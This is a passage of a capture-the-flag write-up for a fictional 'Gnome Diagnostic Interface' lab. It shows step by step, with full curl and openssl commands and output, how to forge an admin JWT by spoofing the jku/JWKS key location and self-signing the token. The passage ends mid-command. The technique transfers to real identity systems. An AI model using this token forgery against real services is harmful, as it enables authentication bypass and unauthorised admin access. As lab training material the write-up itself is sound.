I\u2019m not hacking away, you can catch me enjoying board games, hiking, or paddle boarding!</p> <p>As a pentester, I proper love a good privilege escalation challenge, and that's exactly what we've got here.</p> <p>I've got access to a Gnome's Diagnostic Interface at gnome-48371.atnascorp with the creds gnome:SittingOnAShelf, but it's just a low-privilege account.</p> <p>The gnomes are getting some dodgy updates, and I need admin access to see what's actually going on.</p> <p>Ready to help me find a way to bump up our access level, yeah?</p>"},{"location":"act_2/gnome_identity/#hints","title":"Hints","text":"Rogue Gnome IDP <p>If you need to host any files for the attack, the server is running a webserver available locally at http://paulweb.neighborhood/ . The files for the site are stored in ~/www</p> Rogue Gnome IDP <p><code>https://github.com/ticarpi/jwt_tool/wiki</code> and <code>https://portswigger.net/web-security/jwt</code> have some great information on analyzing JWT's and performing JWT attacks.</p> Rogue Gnome IDP <p>It looks like the JWT uses JWKS. Maybe a JWKS spoofing attack would work.</p>"},{"location":"act_2/gnome_identity/#solution","title":"Solution","text":""},{"location":"act_2/gnome_identity/#exploration","title":"Exploration","text":"<p>The machine contains a file with notes that point us in the right direction to start making some requests:</p> ~/notes <pre><code>paul@paulweb:~$ cat ~/notes\n# Sites\n\n## Captured Gnome:\ncurl http://gnome-48371.atnascorp/\n\n## ATNAS Identity Provider (IdP):\ncurl http://idp.atnascorp/\n\n## My CyberChef website:\ncurl http://paulweb.neighborhood/\n### My CyberChef site html files:\n~/www/\n\n\n# Credentials\n\n## Gnome credentials (found on a post-it):\nGnome:SittingOnAShelf\n\n\n# Curl Commands Used in Analysis of Gnome:\n\n## Gnome Diagnostic Interface authentication required page:\ncurl http://gnome-48371.atnascorp\n\n## Request IDP Login Page\ncurl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth\n\n## Authenticate to IDP\ncurl -X POST --data-binary $'username=gnome&amp;password=SittingOnAShelf&amp;return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login\n\n## Pass Auth Token to Gnome\ncurl -v http://gnome-48371.atnascorp/auth?token=&lt;insert-JWT&gt;\n\n## Access Gnome Diagnostic Interface\ncurl -H 'Cookie: session=&lt;insert-session&gt;' http://gnome-48371.atnascorp/diagnostic-interface\n\n## Analyze the JWT\njwt_tool.py &lt;insert-JWT&gt;\n</code></pre> <p>We can apply what we learned in the notes:</p> Request: webpage <p>We make a request to the provided webpage:</p> <pre><code>paul@paulweb:~$ curl http://gnome-48371.atnascorp\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;AtnasCorp : Gnome Diagnostic Interface&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/styles.css\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n    &lt;h1&gt;AtnasCorp : Gnome Diagnostic Interface&lt;/h1&gt;\n    &lt;form action=\"http://idp.atnascorp/\" method=\"get\"&gt;\n        &lt;input type=\"hidden\" name=\"return_uri\" value=\"http://gnome-48371.atnascorp/auth\"&gt;\n        &lt;button type=\"submit\"&gt;Authenticate&lt;/button&gt;\n    &lt;/form&gt;\n\n&lt;/body&gt;\n</code></pre> Request: return URI <p>We make a request to the identity provider:</p> <pre><code>paul@paulweb:~$ curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth%2Fauth\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;AtnasCorp Identity Provider&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/styles.css\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;AtnasCorp Identity Provider&lt;/h1&gt;\n\n    &lt;!--img src=\"/images/reindeer_sleigh.png\" alt=\"Reindeer pulling Santa's sleigh\" style=\"width: 300px; margin-top: 20px;\"--&gt;\n    &lt;form method=\"POST\" action=\"/login\"&gt;\n        &lt;label for=\"username\"&gt;Username:&lt;/label&gt;\n        &lt;input type=\"text\" id=\"username\" name=\"username\" required&gt;&lt;br&gt;\n        &lt;label for=\"password\"&gt;Password:&lt;/label&gt;\n        &lt;input type=\"password\" id=\"password\" name=\"password\" required&gt;&lt;br&gt;\n        &lt;button type=\"submit\"&gt;Login&lt;/button&gt;\n    &lt;input type='hidden' name='return_uri' value='http://gnome-48371.atnascorp/auth'&gt;&lt;/form&gt;\n</code></pre> Request: login &amp; JWT <p>We attempt to login using the provided credentials:</p> <pre><code>paul@paulweb:~$ curl -X POST --data-binary $'username=gnome&amp;password=SittingOnAShelf&amp;return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/loginp/login\n\n&lt;!doctype html&gt;\n&lt;html lang=en&gt;\n&lt;title&gt;Redirecting...&lt;/title&gt;\n&lt;h1&gt;Redirecting...&lt;/h1&gt;\n&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=\"http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.WJOjijHMDhuV_yc1aQCBZGdUK0oX_NlxyRrwB0kMfTzH9x2NUpSjUoqgsFVanCzXnvtxrYxPRD9P6m-LeKteuJ5Y1QI44GbQqFG9hvu7JHp9irwCA722p_v8RhnvmHvegTuOVdCYWBdBcgg6gcy1QCQTIfMMPmwM9ZjeCaSAnt-TGK04CA0-e7CdB7WiQxfcur1RTSb9jVZEFhUG3WlXYHiZZ3D-QB8RI6m0OaHFzTOY3XW_K8EmW0Jk_8t8DyI2Vuo-CU_3g0qOura9EVt2jIMrBgqdHbTWOGaQXetZ7gZHLYtDdJhd2scGIFOGayzANGh9RK8allUk0VBtFL7UEg\"&gt;http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.WJOjijHMDhuV_yc1aQCBZGdUK0oX_NlxyRrwB0kMfTzH9x2NUpSjUoqgsFVanCzXnvtxrYxPRD9P6m-LeKteuJ5Y1QI44GbQqFG9hvu7JHp9irwCA722p_v8RhnvmHvegTuOVdCYWBdBcgg6gcy1QCQTIfMMPmwM9ZjeCaSAnt-TGK04CA0-e7CdB7WiQxfcur1RTSb9jVZEFhUG3WlXYHiZZ3D-QB8RI6m0OaHFzTOY3XW_K8EmW0Jk_8t8DyI2Vuo-CU_3g0qOura9EVt2jIMrBgqdHbTWOGaQXetZ7gZHLYtDdJhd2scGIFOGayzANGh9RK8allUk0VBtFL7UEg&lt;/a&gt;. If not, click the link.\n</code></pre> <p>This provides us with the following JSON Web Token (JWT): </p><pre><code>eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.WJOjijHMDhuV_yc1aQCBZGdUK0oX_NlxyRrwB0kMfTzH9x2NUpSjUoqgsFVanCzXnvtxrYxPRD9P6m-LeKteuJ5Y1QI44GbQqFG9hvu7JHp9irwCA722p_v8RhnvmHvegTuOVdCYWBdBcgg6gcy1QCQTIfMMPmwM9ZjeCaSAnt-TGK04CA0-e7CdB7WiQxfcur1RTSb9jVZEFhUG3WlXYHiZZ3D-QB8RI6m0OaHFzTOY3XW_K8EmW0Jk_8t8DyI2Vuo-CU_3g0qOura9EVt2jIMrBgqdHbTWOGaQXetZ7gZHLYtDdJhd2scGIFOGayzANGh9RK8allUk0VBtFL7UEg\n</code></pre><p></p> <p>This decodes to the following:</p> <pre><code>paul@paulweb:~$ jwt_tool.py eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.WJOjijHMDhuV_yc1aQCBZGdUK0oX_NlxyRrwB0kMfTzH9x2NUpSjUoqgsFVanCzXnvtxrYxPRD9P6m-LeKteuJ5Y1QI44GbQqFG9hvu7JHp9irwCA722p_v8RhnvmHvegTuOVdCYWBdBcgg6gcy1QCQTIfMMPmwM9ZjeCaSAnt-TGK04CA0-e7CdB7WiQxfcur1RTSb9jVZEFhUG3WlXYHiZZ3D-QB8RI6m0OaHFzTOY3XW_K8EmW0Jk_8t8DyI2Vuo-CU_3g0qOura9EVt2jIMrBgqdHbTWOGaQXetZ7gZHLYtDdJhd2scGIFOGayzANGh9RK8allUk0VBtFL7UEg\n\n        \\   \\        \\         \\          \\                    \\\n\n\\_\\_ | | \\ |\\_\\_ **| \\_\\_ **| |\n| | \\ | | | \\ \\ |\n| \\ | | | ** \\ ** \\ |\n\\ | \\_ | | | | | | | |\n| | / \\ | | | | | | | |\n\\ | / \\ | | |\\ |\\ | |\n\\_**\\_**/ \\_\\_/ \\_\\_| \\_\\_| \\_\\_| \\_**\\_**/ \\_**\\_**/ \\_\\_|\nVersion 2.3.0 \\_**\\_**| @ticarpi\n\n/home/paul/.jwt_tool/jwtconf.ini\nOriginal JWT:\n\n=====================\nDecoded Token Values:\n=====================\n\nToken header values:\n[+] alg = \"RS256\"\n[+] jku = \"http://idp.atnascorp/.well-known/jwks.json\"\n[+] kid = \"idp-key-2025\"\n[+] typ = \"JWT\"\n\nToken payload values:\n[+] sub = \"gnome\"\n[+] iat = 1763292869 ==&gt; TIMESTAMP = 2025-11-16 11:34:29 (UTC)\n[+] exp = 1763300069 ==&gt; TIMESTAMP = 2025-11-16 13:34:29 (UTC)\n[+] iss = \"http://idp.atnascorp/\"\n[+] admin = False\n\nSeen timestamps:\n[*] iat was seen\n[*] exp is later than iat by: 0 days, 2 hours, 0 mins\n\n---\n\nJWT common timestamps:\niat = IssuedAt\nexp = Expires\nnbf = NotBefore\n\n---\n</code></pre> Request: pass auth token <p>We submit the previously received JWT token to receive a session cookie:</p> <pre><code>paul@paulweb:~$ curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.WJOjijHMDhuV_yc1aQCBZGdUK0oX_NlxyRrwB0kMfTzH9x2NUpSjUoqgsFVanCzXnvtxrYxPRD9P6m-LeKteuJ5Y1QI44GbQqFG9hvu7JHp9irwCA722p_v8RhnvmHvegTuOVdCYWBdBcgg6gcy1QCQTIfMMPmwM9ZjeCaSAnt-TGK04CA0-e7CdB7WiQxfcur1RTSb9jVZEFhUG3WlXYHiZZ3D-QB8RI6m0OaHFzTOY3XW_K8EmW0Jk_8t8DyI2Vuo-CU_3g0qOura9EVt2jIMrBgqdHbTWOGaQXetZ7gZHLYtDdJhd2scGIFOGayzANGh9RK8allUk0VBtFL7UEg\n\n- Host gnome-48371.atnascorp:80 was resolved.\n- IPv6: (none)\n- IPv4: 127.0.0.1\n- Trying 127.0.0.1:80...\n- Connected to gnome-48371.atnascorp (127.0.0.1) port 80\n&gt; GET /auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.WJOjijHMDhuV*yc1aQCBZGdUK0oX_NlxyRrwB0kMfTzH9x2NUpSjUoqgsFVanCzXnvtxrYxPRD9P6m-LeKteuJ5Y1QI44GbQqFG9hvu7JHp9irwCA722p_v8RhnvmHvegTuOVdCYWBdBcgg6gcy1QCQTIfMMPmwM9ZjeCaSAnt-TGK04CA0-e7CdB7WiQxfcur1RTSb9jVZEFhUG3WlXYHiZZ3D-QB8RI6m0OaHFzTOY3XW_K8EmW0Jk_8t8DyI2Vuo-CU_3g0qOura9EVt2jIMrBgqdHbTWOGaQXetZ7gZHLYtDdJhd2scGIFOGayzANGh9RK8allUk0VBtFL7UEg HTTP/1.1\n&gt; Host: gnome-48371.atnascorp\n&gt; User-Agent: curl/8.5.0\n&gt; Accept: */\\_\n&gt;\n&gt; &lt; HTTP/1.1 302 FOUND\n&gt; &lt; Date: Sun, 16 Nov 2025 11:36:37 GMT\n&gt; &lt; Server: Werkzeug/3.0.1 Python/3.12.3\n&gt; &lt; Content-Type: text/html; charset=utf-8\n&gt; &lt; Content-Length: 229\n&gt; &lt; Location: /diagnostic-interface\n&gt; &lt; Vary: Cookie\n&gt; &lt; Set-Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aRm3RQ.as0b-rNHjVmlKdy9Qs5CFF9hniY; HttpOnly; Path=/\n&gt; &lt;\n&lt;!doctype html&gt;\n&lt;html lang=en&gt;\n&lt;title&gt;Redirecting...&lt;/title&gt;\n&lt;h1&gt;Redirecting...&lt;/h1&gt;\n&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=\"/diagnostic-interface\"&gt;/diagnostic-interface&lt;/a&gt;. If not, click the link.\n- Connection #0 to host gnome-48371.atnascorp left intact\n</code></pre> Request: pass cookie <p>We leverage the received cookie and see that our access is limited:</p> <pre><code>paul@paulweb:~$ curl -H 'Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aRm3RQ.as0b-rNHjVmlKdy9Qs5CFF9hniY' http://gnome-48371.atnascorp/diagnostic-interface\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;AtnasCorp : Gnome Diagnostic Interface&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/styles.css\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1&gt;AtnasCorp : Gnome Diagnostic Interface&lt;/h1&gt;\n&lt;p&gt;Welcome gnome&lt;/p&gt;&lt;p&gt;Diagnostic access is only available to admins.&lt;/p&gt;\n\n&lt;/body&gt;\n</code></pre>"},{"location":"act_2/gnome_identity/#exploitation","title":"Exploitation","text":"<p>We need to alter the JWT token to become an admin. We can achieve this through JWKS spoofing. We can define our own JWKS file and point the JWT to that one to hijack the token verification process. This way, we can self-sign the token and bypass integrity validation.</p> <p>We check the JWKS configuration in use:</p> Request: JWKS config <pre><code>paul@paulweb:~$ curl -v http://idp.atnascorp/.well-known/jwks.json\n\n- Host idp.atnascorp:80 was resolved.\n- IPv6: (none)\n- IPv4: 127.0.0.1\n- Trying 127.0.0.1:80...\n- Connected to idp.atnascorp (127.0.0.1) port 80\n&gt; GET /.well-known/jwks.json HTTP/1.1\n&gt; Host: idp.atnascorp\n&gt; User-Agent: curl/8.5.0\n&gt; Accept: _/_\n&gt;\n&gt; &lt; HTTP/1.1 200 OK\n&gt; &lt; Date: Sun, 16 Nov 2025 11:59:30 GMT\n&gt; &lt; Server: Werkzeug/3.0.1 Python/3.12.3\n&gt; &lt; Content-Type: application/json\n&gt; &lt; Content-Length: 476\n&gt; &lt;\n&gt; {\n&gt; \"keys\": [\n    {\n        \"e\": \"AQAB\",\n        \"kid\": \"idp-key-2025\",\n        \"kty\": \"RSA\",\n        \"n\": \"7WWfvxwIZ44wIZqPFP9EEemmwMhKgBakYPx736W5gGD8YJlmMzanxdi8NANJ6kyMN-ErFOKJuIQn01PmAeq7On4OCwLyQpB5dHXiidZPRjb2lbrrL1k32svdeo6VGCnzdrGu6KtDHxHn8m9H3WqGVmi2OmCZsk6fJbnoklnJaFiygUkC4IMbk92cbYvajPTqV9C6yWCROPagxQFmybq1hNJoY-FRntEKwBN89Dow8d-PsGMten3CmzDQ9o8rXKs6euk9xLfX06og5Wm1aKJk686WzhtqgdmBjqt2w34EJGlEL0ZSvPdB9nPqxao83N-ah-IYeoiCnSUBKjXI-IRSjQ\",\n        \"use\": \"sig\"\n    }\n]\n}\n- Connection #0 to host idp.atnascorp left intact\n</code></pre>"},{"location":"act_2/gnome_identity/#cryptography","title":"Cryptography","text":"<p>We see it uses RSA. We can generate RSA keys ourselves:</p> <pre><code>openssl genrsa -out jwtRSA256-private.pem 2048\nopenssl rsa -in jwtRSA256-private.pem -pubout -outform PEM -out jwtRSA256-public.pem\n</code></pre> <p>AI usage</p> <p>We need the RSA modulus encoded in base64url form for the JWKS.json. We locate the modulus block, remove colons and whitespace (CyberChef), Hex-decode it to bytes, and then base64url encode.</p> <p>Extract modulus:</p> <pre><code>paul@paulweb:~$ openssl rsa -in jwtRSA256-public.pem -pubin -text -noout\nPublic-Key: (2048 bit)\nModulus:\n00:8c:db:fa:3c:33:05:75:5e:39:c8:0e:b9:21:44:\n64:e2:13:2c:40:ad:6e:e4:47:69:7d:1b:24:1d:e9:\n50:fb:2b:50:91:53:64:e4:07:b4:63:d4:91:5a:67:\ndd:b8:de:90:86:3a:b6:52:7c:91:21:21:60:d7:8f:\n79:b7:28:59:22:0a:46:9a:0a:08:58:39:44:28:14:\n6c:98:79:bb:33:85:e5:9d:1a:6f:16:d0:62:89:56:\nfb:be:dd:b1:b8:af:ff:81:c1:2c:b6:70:43:27:f6:\ne2:26:a1:c1:a0:59:fb:b5:d4:d5:47:e2:57:be:fd:\na0:4d:1f:32:5c:41:ec:ef:a9:ee:1a:3e:7a:29:53:\nb2:61:71:ea:1c:c3:f0:34:98:ec:21:58:96:ba:09:\ncb:43:5f:eb:47:08:a7:da:8d:ca:63:ee:e0:d5:0a:\nb5:fd:33:24:43:e5:cb:fc:c6:9d:f9:db:3d:df:da:\ndb:b4:93:c9:d7:f3:b1:ea:5d:2d:c9:a1:35:99:9f:\nb9:c0:56:01:3d:42:72:c1:25:2c:a8:c6:fa:cc:43:\n4f:2e:9d:20:2a:52:3e:ab:6a:c6:f8:4a:aa:c5:8b:\nac:0c:f2:91:2e:48:86:4c:a3:59:11:f9:41:c3:eb:\ne2:ff:47:37:bc:83:3a:e0:0d:e2:b3:88:6c:ba:2a:\ne1:c1\nExponent: 65537 (0x10001)\n</code></pre> <p>Hex to bytes:</p> <pre><code>paul@paulweb:~$ printf \"008cdbfa3c3305755e39c80eb9214464e2132c40ad6ee447697d1b241de950fb2b50915364e407b463d4915a67ddb8de90863ab6527c91212160d78f79b72859220a469a0a0858394428146c9879bb3385e59d1a6f16d0628956fbbeddb1b8afff81c12cb6704327f6e226a1c1a059fbb5d4d547e257befda04d1f325c41ecefa9ee1a3e7a2953b26171ea1cc3f03498ec215896ba09cb435feb4708a7da8dca63eee0d50ab5fd332443e5cbfcc69df9db3ddfdadbb493c9d7f3b1ea5d2dc9a135999fb9c056013d4272c1252ca8c6facc434f2e9d202a523eab6ac6f84aaac58bac0cf2912e48864ca35911f941c3ebe2ff4737bc833ae00de2b3886cba2ae1c1\" | xxd -r -p &gt; modulus.bin\n</code></pre> <p>Base64url:</p> <pre><code>paul@paulweb:~$ cat modulus.bin | openssl base64 -A | tr '+/' '-\\_' | tr -d '='\nAIzb-jwzBXVeOcgOuSFEZOITLECtbuRHaX0bJB3pUPsrUJFTZOQHtGPUkVpn3bjekIY6tlJ8kSEhYNePebcoWSIKRpoKCFg5RCgUbJh5uzOF5Z0abxbQYolW-77dsbiv_4HBLLZwQyf24iahwaBZ-7XU1UfiV779oE0fMlxB7O-p7ho-eilTsmFx6hzD8DSY7CFYlroJy0Nf60cIp9qNymPu4NUKtf0zJEPly_zGnfnbPd_a27STydfzsepdLcmhNZmfucBWAT1CcsElLKjG-sxDTy6dICpSPqtqxvhKqsWLrAzykS5IhkyjWRH5QcPr4v9HN7yDOuAN4rOIbLoq4cE\n</code></pre>"},{"location":"act_2/gnome_identity/#hosting","title":"Hosting","text":"<p>We then host our custom JWKS.json using the CyberChef installation present on the machine (see original 'notes' file):</p> <pre><code>paul@paulweb:~$ curl http://paulweb.neighborhood/jwks.json\n{\n\"keys\": [\n{\n\"e\": \"AQAB\",\n\"kid\": \"custom\",\n\"kty\": \"RSA\",\n\"n\": \"AIzb-jwzBXVeOcgOuSFEZOITLECtbuRHaX0bJB3pUPsrUJFTZOQHtGPUkVpn3bjekIY6tlJ8kSEhYNePebcoWSIKRpoKCFg5RCgUbJh5uzOF5Z0abxbQYolW-77dsbiv_4HBLLZwQyf24iahwaBZ-7XU1UfiV779oE0fMlxB7O-p7ho-eilTsmFx6hzD8DSY7CFYlroJy0Nf60cIp9qNymPu4NUKtf0zJEPly_zGnfnbPd_a27STydfzsepdLcmhNZmfucBWAT1CcsElLKjG-sxDTy6dICpSPqtqxvhKqsWLrAzykS5IhkyjWRH5QcPr4v9HN7yDOuAN4rOIbLoq4cE\",\n\"use\": \"sig\"\n}\n]\n}\n</code></pre>"},{"location":"act_2/gnome_identity/#sign-altered-jwt","title":"Sign altered JWT","text":"<p>We can now sign our malicious, altered JWT.</p> <p>Using online resources we alter our original JWT to have `admin = True', which becomes:</p> <pre><code>eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJjdXN0b20iLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.\n</code></pre> <p>We then generate the signature (third element of JWT):</p> <pre><code>paul@paulweb:~/www$ echo -n \"eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJjdXN0b20iLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0\" | openssl dgst -sha256 -binary -sign ../jwtRSA256-private.pem | openssl enc -base64 | tr -d '\\n=' | tr -- '+/' '-\\_'\ne6FG_5Uv1V-pIqZoOg0OUitLPurOHBzABNdyQ2cpg0jzWNDXb6YfBEa8SlmrvT00l_Zy3cbSpiPy8CdkGMqNQb4IKYR2qw0Mlx7iI1aUwVZhh3pW5okwDLPEWxXu6XlTVKLpFJuyPzTxpQe77HM8z9dv15iEkYI_tgAJX9cCv_IjXiSBo8cJP9HM_nRwTmytHCEKyHeUm6p_SaMRatGFt9MBWHrPqQtcX7wdDFXAHZmzMz08Cpf_QDhDldY3HqgzSJGOxbEdXEh-IlFpF2jVxoD4mI0xobpJnzlxEnJ6A56YBPuy33vUW1QFsvbTT9HFI25fQdS9rSMycQ5KVF13YA\n</code></pre> <p>We then merge these two and have a self-signed altered JWT token:</p> <pre><code>eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJjdXN0b20iLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.e6FG_5Uv1V-pIqZoOg0OUitLPurOHBzABNdyQ2cpg0jzWNDXb6YfBEa8SlmrvT00l_Zy3cbSpiPy8CdkGMqNQb4IKYR2qw0Mlx7iI1aUwVZhh3pW5okwDLPEWxXu6XlTVKLpFJuyPzTxpQe77HM8z9dv15iEkYI_tgAJX9cCv_IjXiSBo8cJP9HM_nRwTmytHCEKyHeUm6p_SaMRatGFt9MBWHrPqQtcX7wdDFXAHZmzMz08Cpf_QDhDldY3HqgzSJGOxbEdXEh-IlFpF2jVxoD4mI0xobpJnzlxEnJ6A56YBPuy33vUW1QFsvbTT9HFI25fQdS9rSMycQ5KVF13YA\n</code></pre>"},{"location":"act_2/gnome_identity/#authenticate","title":"Authenticate","text":"<p>Let's use our altered JWT to authenticate (collect session cookie):</p> Request: auth with altered JWT <pre><code>paul@paulweb:~/www$ curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJjdXN0b20iLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.e6FG_5Uv1V-pIqZoOg0OUitLPurOHBzABNdyQ2cpg0jzWNDXb6YfBEa8SlmrvT00l_Zy3cbSpiPy8CdkGMqNQb4IKYR2qw0Mlx7iI1aUwVZhh3pW5okwDLPEWxXu6XlTVKLpFJuyPzTxpQe77HM8z9dv15iEkYI_tgAJX9cCv_IjXiSBo8cJP9HM_nRwTmytHCEKyHeUm6p_SaMRatGFt9MBWHrPqQtcX7wdDFXAHZmzMz08Cpf_QDhDldY3HqgzSJGOxbEdXEh-IlFpF2jVxoD4mI0xobpJnzlxEnJ6A56YBPuy33vUW1QFsvbTT9HFI25fQdS9rSMycQ5KVF13YA\n\n- Host gnome-48371.atnascorp:80 was resolved.\n- IPv6: (none)\n- IPv4: 127.0.0.1\n- Trying 127.0.0.1:80...\n- Connected to gnome-48371.atnascorp (127.0.0.1) port 80\n&gt; GET /auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJjdXN0b20iLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.e6FG*5Uv1V-pIqZoOg0OUitLPurOHBzABNdyQ2cpg0jzWNDXb6YfBEa8SlmrvT00l_Zy3cbSpiPy8CdkGMqNQb4IKYR2qw0Mlx7iI1aUwVZhh3pW5okwDLPEWxXu6XlTVKLpFJuyPzTxpQe77HM8z9dv15iEkYI_tgAJX9cCv_IjXiSBo8cJP9HM_nRwTmytHCEKyHeUm6p_SaMRatGFt9MBWHrPqQtcX7wdDFXAHZmzMz08Cpf_QDhDldY3HqgzSJGOxbEdXEh-IlFpF2jVxoD4mI0xobpJnzlxEnJ6A56YBPuy33vUW1QFsvbTT9HFI25fQdS9rSMycQ5KVF13YA HTTP/1.1\n&gt; Host: gnome-48371.atnascorp\n&gt; User-Agent: curl/8.5.0\n&gt; Accept: */\\_\n&gt;\n&gt; &lt; HTTP/1.1 302 FOUND\n&gt; &lt; Date: Sun, 16 Nov 2025 12:31:12 GMT\n&gt; &lt; Server: Werkzeug/3.0.1 Python/3.12.3\n&gt; &lt; Content-Type: text/html; charset=utf-8\n&gt; &lt; Content-Length: 229\n&gt; &lt; Location: /diagnostic-interface\n&gt; &lt; Vary: Cookie\n&gt; &lt; Set-Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aRnEEA.a8PDShbSAlNFpOTirEfpVicYmbU; HttpOnly; Path=/\n&gt; &lt;\n&lt;!doctype html&gt;\n&lt;html lang=en&gt;\n&lt;title&gt;Redirecting...&lt;/title&gt;\n&lt;h1&gt;Redirecting...&lt;/h1&gt;\n&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=\"/diagnostic-interface\"&gt;/diagnostic-interface&lt;/a&gt;. If not, click the link.\n- Connection #0 to host gnome-48371.atnascorp left intact\n</code></pre> <p>We can then finally authenticate completely using the session cookie:</p> Solution <p></p><pre><code>paul@paulweb:~/www$ curl 